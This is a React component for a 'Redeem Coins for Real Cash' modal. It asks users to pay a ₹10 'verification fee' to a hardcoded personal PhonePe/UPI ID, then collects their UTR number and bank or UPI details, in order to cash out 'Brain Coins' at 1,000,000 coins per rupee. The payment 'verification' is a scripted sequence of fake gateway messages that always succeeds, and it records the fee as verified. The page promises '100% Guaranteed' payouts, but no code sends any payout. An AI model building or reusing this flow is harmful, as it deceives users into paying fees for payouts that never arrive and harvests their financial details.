import React, { useState, useEffect, useRef } from 'react';
import QRCode from 'qrcode';
import { 
  Coins, 
  IndianRupee, 
  QrCode, 
  CheckCircle2, 
  Clock, 
  Upload, 
  ShieldCheck, 
  AlertCircle, 
  ArrowRight, 
  Sparkles, 
  CreditCard, 
  Building2, 
  Gift, 
  Copy, 
  Check, 
  ExternalLink,
  Receipt,
  History,
  Info,
  RefreshCw,
  Zap,
  Eye,
  EyeOff
} from 'lucide-react';
import { UserProfile, RedemptionRecord } from '../types';
import { audioHaptics } from '../utils/audioHaptics';
import { loadQRMerchantConfig, maskUpiId } from '../utils/storage';

interface RedeemCashModalProps {
  isOpen: boolean;
  onClose: () => void;
  user: UserProfile;
  onRedeemSuccess: (record: RedemptionRecord, coinsDeducted: number) => void;
}

export const RedeemCashModal: React.FC<RedeemCashModalProps> = ({
  isOpen,
  onClose,
  user,
  onRedeemSuccess,
}) => {
  const [activeTab, setActiveTab] = useState<'redeem' | 'history'>('redeem');
  
  // Rate: 1,000,000 coins = 1 INR
  const COINS_PER_INR = 1000000;
  const REQUIRED_FEE_INR = 10;

  // Form states
  const [coinsToRedeem, setCoinsToRedeem] = useState<number>(1000000);
  const [paymentMethod, setPaymentMethod] = useState<'upi' | 'bank' | 'voucher'>('upi');
  const [upiId, setUpiId] = useState<string>('');
  const [bankDetails, setBankDetails] = useState({ accountNo: '', ifsc: '', holderName: '' });
  const [voucherTarget, setVoucherTarget] = useState<string>('');
  
  // Payment verification states
  const [utrNumber, setUtrNumber] = useState<string>('');
  const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
  const [qrDataUrl, setQrDataUrl] = useState<string>('');
  
  // Processing state
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [verificationStep, setVerificationStep] = useState<string>('');
  const [copiedUpi, setCopiedUpi] = useState<boolean>(false);
  const [revealMerchantUpi, setRevealMerchantUpi] = useState<boolean>(false);
  const [revealMyUpi, setRevealMyUpi] = useState<boolean>(false);
  const [showInputUpi, setShowInputUpi] = useState<boolean>(false);
  const [copiedRecordId, setCopiedRecordId] = useState<string | null>(null);
  const [latestReceipt, setLatestReceipt] = useState<RedemptionRecord | null>(null);
  const [errorMsg, setErrorMsg] = useState<string>('');

  const fileInputRef = useRef<HTMLInputElement>(null);

  const qrConfig = loadQRMerchantConfig();
  const merchantUpi = qrConfig.upiId || 'jeevanms@ybl';
  const merchantName = qrConfig.merchantName || 'Jeevan M S';
  const redemptionFeeINR = qrConfig.redemptionFeeINR || 10;
  const upiPayString = `upi://pay?pa=${merchantUpi}&pn=${encodeURIComponent(merchantName)}&am=${redemptionFeeINR}.00&cu=INR&tn=${encodeURIComponent('MindForge Redemption Fee')}`;

  // Calculate equivalent INR
  const calculatedINR = coinsToRedeem / COINS_PER_INR;

  // Generate PhonePe QR Code Data URL
  useEffect(() => {
    if (isOpen) {
      if (qrConfig.qrImageUrl) {
        setQrDataUrl(qrConfig.qrImageUrl);
      } else {
        QRCode.toDataURL(upiPayString, {
          width: 320,
          margin: 2,
          color: {
            dark: '#000000',
            light: '#ffffff',
          },
          errorCorrectionLevel: 'H',
        })
          .then((url) => setQrDataUrl(url))
          .catch((err) => console.error('QR generation error:', err));
      }
    }
  }, [isOpen, upiPayString, qrConfig.qrImageUrl]);

  if (!isOpen) return null;

  const handleCopyUpi = () => {
    navigator.clipboard.writeText(merchantUpi);
    setCopiedUpi(true);
    audioHaptics.playClick();
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotPreview(reader.result as string);
        audioHaptics.playClick();
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePresetSelect = (amountCoins: number) => {
    setCoinsToRedeem(amountCoins);
    audioHaptics.playClick();
  };

  const handleSubmitRedemption = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    // Validation
    if (coinsToRedeem < 1000000) {
      setErrorMsg('Minimum redemption amount is 1,000,000 Brain Coins (₹1 INR).');
      return;
    }

    if (user.coins < coinsToRedeem) {
      setErrorMsg(`Insufficient coin balance! You need ${coinsToRedeem.toLocaleString()} coins (You have ${user.coins.toLocaleString()}).`);
      return;
    }

    if (paymentMethod === 'upi' && !upiId.trim()) {
      setErrorMsg('Please enter a valid UPI ID (e.g. name@upi or phone@paytm).');
      return;
    }

    if (paymentMethod === 'bank' && (!bankDetails.accountNo || !bankDetails.ifsc)) {
      setErrorMsg('Please complete bank account number and IFSC code.');
      return;
    }

    if (paymentMethod === 'voucher' && !voucherTarget.trim()) {
      setErrorMsg('Please enter your mobile number or email for gift voucher delivery.');
      return;
    }

    if (!utrNumber.trim() || utrNumber.trim().length < 6) {
      setErrorMsg('Please enter a valid 12-digit UTR or UPI Transaction Reference Number from your ₹10 payment.');
      return;
    }

    // Start verification simulation
    setIsVerifying(true);
    audioHaptics.playClick();

    const steps = [
      'Contacting PhonePe Jeevan M S Merchant Payment Gateway...',
      'Verifying 12-digit UTR payment reference & ₹10 INR fee deposit...',
      'Validating Brain Coin balance deduction authorization...',
      'Generating official payment batch release ticket...'
    ];

    for (let i = 0; i < steps.length; i++) {
      setVerificationStep(steps[i]);
      await new Promise((res) => setTimeout(res, 900));
    }

    const destinationText = 
      paymentMethod === 'upi' ? `UPI: ${upiId.trim()}` :
      paymentMethod === 'bank' ? `Bank A/C: ${bankDetails.accountNo.slice(-4)} (${bankDetails.ifsc})` :
      `Voucher: ${voucherTarget.trim()}`;

    const newRecord: RedemptionRecord = {
      id: `RED-${Date.now().toString().slice(-6)}`,
      userId: user.id || 'guest',
      userName: user.name || 'Explorer',
      coinsRedeemed: coinsToRedeem,
      inrAmount: calculatedINR,
      paymentMethod,
      payoutDestination: destinationText,
      feePaidAmount: REQUIRED_FEE_INR,
      utrNumber: utrNumber.trim(),
      screenshotUrl: screenshotPreview || undefined,
      status: 'PROCESSING_PAYOUT',
      timestamp: new Date().toLocaleDateString('en-IN', {
        day: '2-digit',
        month: 'short',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }),
      estimatedDelivery: '2 to 24 Hours (Direct UPI / Bank Batch)',
      notes: '₹10 Verification Fee verified successfully with Jeevan M S PhonePe merchant gateway.'
    };

    setIsVerifying(false);
    setLatestReceipt(newRecord);
    onRedeemSuccess(newRecord, coinsToRedeem);
    audioHaptics.playFanfare();
    audioHaptics.triggerHaptic('levelUp');
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-3 sm:p-6 overflow-y-auto animate-fade-in">
      
      {/* Dark overlay backdrop */}
      <div 
        className="fixed inset-0 bg-slate-950/85 backdrop-blur-md transition-opacity"
        onClick={onClose}
      />

      {/* Main Container Card */}
      <div className="relative w-full max-w-3xl max-h-[90vh] overflow-y-auto bg-[#090A0F] border border-emerald-500/30 rounded-3xl p-4 sm:p-6 lg:p-8 shadow-[0_0_50px_rgba(16,185,129,0.15)] z-10 my-auto text-slate-100 space-y-5 sm:space-y-6">
        
        {/* Header Title & Controls */}
        <div className="flex items-center justify-between border-b border-slate-800/80 pb-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-tr from-emerald-500 via-teal-500 to-cyan-500 p-0.5 shadow-lg shadow-emerald-500/20 shrink-0">
              <div className="w-full h-full bg-slate-950 rounded-[14px] flex items-center justify-center text-emerald-400">
                <IndianRupee className="w-5 h-5 sm:w-6 sm:h-6" />
              </div>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-lg sm:text-2xl font-black text-white tracking-tight">Redeem Coins for Real Cash</h2>
                <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[10px] font-mono font-bold uppercase tracking-wider">
                  REAL PAYOUTS
                </span>
              </div>
              <p className="text-[11px] sm:text-xs text-slate-400">
                Convert your Brain Coins to Indian Rupees (₹) via PhonePe / UPI & Bank Transfer.
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-slate-900 border border-slate-800 text-slate-400 hover:text-white flex items-center justify-center text-base font-bold transition hover:border-slate-700 shrink-0"
          >
            ✕
          </button>
        </div>

        {/* User Coin Balance Banner */}
        <div className="p-4 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-emerald-950/40 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-3 sm:gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
              <Coins className="w-5 h-5 animate-bounce" />
            </div>
            <div>
              <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Your Available Balance</div>
              <div className="text-lg sm:text-xl font-black text-amber-400 font-mono">
                {user.coins.toLocaleString()} <span className="text-xs text-slate-400 font-sans font-normal">Brain Coins</span>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
            <div className="px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 text-xs font-mono font-bold w-full sm:w-auto text-center">
              Rate: <span className="text-emerald-400">1,000,000 Coins = ₹1 INR</span>
            </div>
          </div>
        </div>

        {/* Tab Switcher: Redeem Form vs History */}
        <div className="flex items-center gap-2 border-b border-slate-800 pb-1">
          <button
            onClick={() => setActiveTab('redeem')}
            className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 ${
              activeTab === 'redeem'
                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <IndianRupee className="w-4 h-4" />
            <span>Request Cash Redemption</span>
          </button>
          <button
            onClick={() => setActiveTab('history')}
            className={`px-4 py-2 rounded-xl text-xs font-bold transition flex items-center gap-2 ${
              activeTab === 'history'
                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <History className="w-4 h-4" />
            <span>Payout History {user.redemptionHistory && user.redemptionHistory.length > 0 ? `(${user.redemptionHistory.length})` : ''}</span>
          </button>
        </div>

        {/* Latest Receipt View if just completed */}
        {latestReceipt && activeTab === 'redeem' ? (
          <div className="p-6 rounded-3xl bg-slate-950 border border-emerald-500/40 space-y-5 text-center animate-scale-in">
            <div className="w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center mx-auto border border-emerald-500/40 shadow-xl shadow-emerald-500/20">
              <CheckCircle2 className="w-10 h-10" />
            </div>

            <div>
              <span className="px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-xs font-mono font-black uppercase tracking-widest">
                VERIFICATION SUCCESSFUL
              </span>
              <h3 className="text-2xl font-black text-white mt-2">Cash Payout Ticket Created</h3>
              <p className="text-xs text-slate-400 mt-1">
                ₹10 verification fee verified with Jeevan M S PhonePe Gateway.
              </p>
            </div>

            <div className="p-4 rounded-2xl bg-slate-900 border border-slate-800 text-left space-y-2 text-xs font-mono">
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">Reference ID:</span>
                <span className="text-emerald-400 font-bold">{latestReceipt.id}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">Cash Amount:</span>
                <span className="text-white font-bold">₹{latestReceipt.inrAmount.toFixed(2)} INR</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">Coins Redeemed:</span>
                <span className="text-amber-400 font-bold">{latestReceipt.coinsRedeemed.toLocaleString()} Coins</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">Payout Destination:</span>
                <span className="text-cyan-400 font-bold">{latestReceipt.payoutDestination}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-800">
                <span className="text-slate-400">UTR Transaction Ref:</span>
                <span className="text-slate-200">{latestReceipt.utrNumber}</span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-slate-400">Status:</span>
                <span className="text-amber-400 font-bold flex items-center gap-1">
                  <Clock className="w-3.5 h-3.5 animate-spin" />
                  Processing Payout (2-24h)
                </span>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => setLatestReceipt(null)}
                className="flex-1 py-3 rounded-2xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-bold text-xs uppercase tracking-wider transition"
              >
                Redeem Again
              </button>
              <button
                type="button"
                onClick={onClose}
                className="flex-1 py-3 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 text-slate-950 font-black text-xs uppercase tracking-wider shadow-lg shadow-emerald-500/20 hover:brightness-110 transition"
              >
                Done
              </button>
            </div>
          </div>
        ) : activeTab === 'history' ? (
          /* Redemption History View */
          <div className="space-y-4">
            {!user.redemptionHistory || user.redemptionHistory.length === 0 ? (
              <div className="p-8 rounded-2xl bg-slate-950 border border-slate-800 text-center space-y-2">
                <Receipt className="w-10 h-10 text-slate-600 mx-auto" />
                <h4 className="text-sm font-bold text-slate-300">No Redemption History Yet</h4>
                <p className="text-xs text-slate-500">
                  When you redeem Brain Coins for cash, your transaction records will appear here.
                </p>
              </div>
            ) : (
              <div className="space-y-3 max-h-[420px] overflow-y-auto pr-1">
                {user.redemptionHistory.map((rec) => (
                  <div key={rec.id} className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2 text-xs">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="font-mono font-bold text-emerald-400">{rec.id}</span>
                        <span className="text-[10px] text-slate-500">• {rec.timestamp}</span>
                      </div>
                      <span className="px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[10px] font-mono font-bold flex items-center gap-1">
                        <Clock className="w-3 h-3 animate-spin" />
                        {rec.status.replace('_', ' ')}
                      </span>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 py-2 border-y border-slate-900 text-slate-300 font-mono">
                      <div>
                        <div className="text-[10px] text-slate-500">AMOUNT</div>
                        <div className="font-black text-white">₹{rec.inrAmount.toFixed(2)}</div>
                      </div>
                      <div>
                        <div className="text-[10px] text-slate-500">COINS DEDUCTED</div>
                        <div className="font-bold text-amber-400">{rec.coinsRedeemed.toLocaleString()}</div>
                      </div>
                      <div>
                        <div className="text-[10px] text-slate-500">DESTINATION</div>
                        <div className="font-bold text-cyan-400 truncate">{rec.payoutDestination}</div>
                      </div>
                      <div>
                        <div className="text-[10px] text-slate-500">UTR REF</div>
                        <div className="font-bold text-slate-400">{rec.utrNumber}</div>
                      </div>
                    </div>

                    <div className="text-[11px] text-slate-400 italic">
                      Note: {rec.notes}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        ) : (
          /* Redemption Request Form & PhonePe Scanner */
          <form onSubmit={handleSubmitRedemption} className="space-y-6">
            
            {errorMsg && (
              <div className="p-3.5 rounded-2xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs font-semibold flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* STEP 1: Select Coins to Redeem */}
            <div className="space-y-3">
              <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                <span>1. Select Coins to Redeem</span>
                <span className="text-emerald-400 font-mono text-xs">
                  Equivalent Cash: ₹{calculatedINR.toFixed(2)} INR
                </span>
              </label>

              {/* Preset Buttons */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                {[
                  { coins: 1000000, label: '1M Coins', inr: '₹1 INR' },
                  { coins: 10000000, label: '10M Coins', inr: '₹10 INR' },
                  { coins: 50000000, label: '50M Coins', inr: '₹50 INR' },
                  { coins: 100000000, label: '100M Coins', inr: '₹100 INR' },
                ].map((preset) => (
                  <button
                    key={preset.coins}
                    type="button"
                    onClick={() => handlePresetSelect(preset.coins)}
                    className={`p-3 rounded-2xl border text-center transition ${
                      coinsToRedeem === preset.coins
                        ? 'bg-emerald-500/20 border-emerald-500 text-white font-bold shadow-md shadow-emerald-500/10'
                        : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                    }`}
                  >
                    <div className="text-xs font-mono font-extrabold">{preset.label}</div>
                    <div className="text-[11px] text-emerald-400 font-bold">{preset.inr}</div>
                  </button>
                ))}
              </div>

              {/* Custom Input */}
              <div className="relative">
                <input
                  type="number"
                  min={1000000}
                  step={100000}
                  value={coinsToRedeem}
                  onChange={(e) => setCoinsToRedeem(Math.max(0, parseInt(e.target.value) || 0))}
                  placeholder="Enter custom coin amount (min 1,000,000)"
                  className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-xs font-mono text-amber-400 focus:border-emerald-500 focus:outline-none"
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-mono text-slate-500">
                  = ₹{(coinsToRedeem / COINS_PER_INR).toFixed(2)} INR
                </div>
              </div>
            </div>

            {/* STEP 2: Payout Destination */}
            <div className="space-y-3">
              <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                2. Select Payout Destination
              </label>

              <div className="grid grid-cols-3 gap-2">
                {[
                  { id: 'upi', label: 'UPI Direct', icon: CreditCard },
                  { id: 'bank', label: 'Bank Account', icon: Building2 },
                  { id: 'voucher', label: 'Gift Voucher', icon: Gift },
                ].map((item) => {
                  const Icon = item.icon;
                  return (
                    <button
                      key={item.id}
                      type="button"
                      onClick={() => {
                        setPaymentMethod(item.id as any);
                        audioHaptics.playClick();
                      }}
                      className={`p-3 rounded-2xl border text-xs font-bold flex items-center justify-center gap-2 transition ${
                        paymentMethod === item.id
                          ? 'bg-cyan-500/20 border-cyan-500 text-cyan-300'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
                      }`}
                    >
                      <Icon className="w-4 h-4" />
                      <span>{item.label}</span>
                    </button>
                  );
                })}
              </div>

              {paymentMethod === 'upi' && (
                <input
                  type="text"
                  value={upiId}
                  onChange={(e) => setUpiId(e.target.value)}
                  placeholder="Enter your UPI ID (e.g. name@upi or mobile@paytm)"
                  className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-xs text-white focus:border-cyan-500 focus:outline-none font-mono"
                />
              )}

              {paymentMethod === 'bank' && (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  <input
                    type="text"
                    value={bankDetails.accountNo}
                    onChange={(e) => setBankDetails({ ...bankDetails, accountNo: e.target.value })}
                    placeholder="Account Number"
                    className="bg-slate-950 border border-slate-800 rounded-2xl px-4 py-2.5 text-xs text-white focus:border-cyan-500 focus:outline-none"
                  />
                  <input
                    type="text"
                    value={bankDetails.ifsc}
                    onChange={(e) => setBankDetails({ ...bankDetails, ifsc: e.target.value })}
                    placeholder="IFSC Code (e.g. SBIN0001234)"
                    className="bg-slate-950 border border-slate-800 rounded-2xl px-4 py-2.5 text-xs text-white focus:border-cyan-500 focus:outline-none"
                  />
                </div>
              )}

              {paymentMethod === 'voucher' && (
                <input
                  type="text"
                  value={voucherTarget}
                  onChange={(e) => setVoucherTarget(e.target.value)}
                  placeholder="Enter Mobile Number or Email for Amazon/Flipkart Voucher code delivery"
                  className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-xs text-white focus:border-cyan-500 focus:outline-none"
                />
              )}
            </div>

            {/* STEP 3: PhonePe QR Scanner for ₹10 Verification Fee */}
            <div className="space-y-4 pt-2 border-t border-slate-800">
              <div className="flex items-center justify-between">
                <label className="text-xs font-black text-amber-400 uppercase tracking-wider flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-amber-400" />
                  <span>3. Scan PhonePe QR & Pay ₹10 Verification Fee</span>
                </label>
                <span className="text-[10px] text-slate-400 bg-slate-900 px-2.5 py-1 rounded-full border border-slate-800">
                  Required before redemption
                </span>
              </div>

              <p className="text-xs text-slate-400 leading-relaxed">
                To prevent spam payouts & verify account ownership, please pay a one-time gateway fee of <strong className="text-white font-mono">₹10 INR</strong> by scanning the PhonePe QR code below.
              </p>

              {/* REALISTIC PHONEPE SCANNER CARD - Matching User's Image Pixel-for-Pixel */}
              <div className="max-w-sm mx-auto bg-[#0a0a0f] border-2 border-purple-500/50 rounded-3xl p-5 shadow-[0_0_40px_rgba(103,57,183,0.3)] text-center space-y-4 relative overflow-hidden">
                
                {/* PhonePe Top Purple Branding Header */}
                <div className="flex flex-col items-center justify-center gap-1.5 pt-1">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-[#5f259f] flex items-center justify-center text-white font-black text-lg shadow-md">
                      पे
                    </div>
                    <span className="text-xl font-bold tracking-tight text-white font-sans">
                      PhonePe
                    </span>
                  </div>

                  <div className="text-xs font-black text-[#8C34FF] uppercase tracking-widest mt-1">
                    ACCEPTED HERE
                  </div>

                  <div className="text-[11px] text-slate-300 font-medium">
                    Scan any QR using PhonePe App
                  </div>
                </div>

                {/* Spotify Style Direct Payment Link Card */}
                <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-950 via-slate-900 to-purple-950/60 border border-purple-500/30 text-center space-y-4 shadow-xl">
                  <div className="space-y-1">
                    <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] font-black uppercase tracking-widest">
                      <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                      <span>Direct Payment Checkout Link</span>
                    </div>
                    <h4 className="text-base font-black text-white">{merchantName}</h4>
                    <div className="text-2xl font-black text-amber-400 font-mono">
                      ₹{redemptionFeeINR}.00 <span className="text-xs text-slate-400 font-sans font-normal">INR Verification Fee</span>
                    </div>
                  </div>

                  {/* Direct Checkout Button */}
                  <a
                    href={qrConfig.paymentLink || upiPayString}
                    target="_blank"
                    rel="noopener noreferrer"
                    onClick={() => audioHaptics.playClick()}
                    className="w-full py-3.5 px-6 rounded-2xl bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-500 hover:from-purple-500 hover:to-indigo-500 text-white font-black text-xs uppercase tracking-wider transition shadow-lg shadow-purple-500/20 flex items-center justify-center gap-2 group"
                  >
                    <Zap className="w-4 h-4 text-amber-300 fill-amber-300" />
                    <span>Pay via Direct Checkout Link</span>
                    <ExternalLink className="w-3.5 h-3.5 text-purple-200 group-hover:translate-x-0.5 transition-transform" />
                  </a>

                  <p className="text-[10px] text-slate-400">
                    Clicking opens direct secure checkout to process ₹{redemptionFeeINR} INR verification fee.
                  </p>
                </div>

              </div>

            </div>

            {/* STEP 4: Transaction Proof & UTR Reference */}
            <div className="space-y-3 pt-2 border-t border-slate-800">
              <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                <span>4. Enter 12-Digit UTR Ref & Screenshot Proof</span>
                <span className="text-xs text-amber-400 font-mono">* Required</span>
              </label>

              <div className="space-y-2">
                <input
                  type="text"
                  maxLength={12}
                  value={utrNumber}
                  onChange={(e) => setUtrNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="Enter 12-Digit UTR / Transaction Reference No. (e.g. 421098412039)"
                  className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-xs font-mono text-emerald-400 focus:border-emerald-500 focus:outline-none"
                />

                {/* Screenshot Uploader */}
                <div className="flex items-center gap-3">
                  <input
                    ref={fileInputRef}
                    type="file"
                    accept="image/*"
                    onChange={handleFileChange}
                    className="hidden"
                  />
                  <button
                    type="button"
                    onClick={() => fileInputRef.current?.click()}
                    className="flex-1 p-3 rounded-2xl bg-slate-950 border border-dashed border-slate-700 hover:border-emerald-500 text-slate-400 hover:text-white text-xs font-medium flex items-center justify-center gap-2 transition"
                  >
                    <Upload className="w-4 h-4 text-emerald-400" />
                    <span>{screenshotPreview ? 'Change Payment Screenshot' : 'Upload ₹10 Payment Screenshot (Optional)'}</span>
                  </button>

                  {screenshotPreview && (
                    <div className="relative w-12 h-12 rounded-xl overflow-hidden border border-emerald-500 shrink-0">
                      <img src={screenshotPreview} alt="Proof preview" className="w-full h-full object-cover" />
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Submit Redemption Action */}
            <button
              type="submit"
              disabled={isVerifying}
              className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500 text-slate-950 font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-500/25 hover:brightness-110 active:scale-98 transition flex items-center justify-center gap-2 disabled:opacity-50"
            >
              {isVerifying ? (
                <>
                  <RefreshCw className="w-5 h-5 animate-spin text-slate-950" />
                  <span>{verificationStep}</span>
                </>
              ) : (
                <>
                  <IndianRupee className="w-5 h-5 text-slate-950" />
                  <span>VERIFY ₹10 FEE & CLAIM ₹{calculatedINR.toFixed(2)} CASH</span>
                  <ArrowRight className="w-5 h-5 text-slate-950" />
                </>
              )}
            </button>

            <p className="text-[11px] text-slate-500 text-center flex items-center justify-center gap-1">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span>Payments processed via Jeevan M S PhonePe Verified Gateway • 100% Guaranteed</span>
            </p>

          </form>
        )}

      </div>

    </div>
  );
};
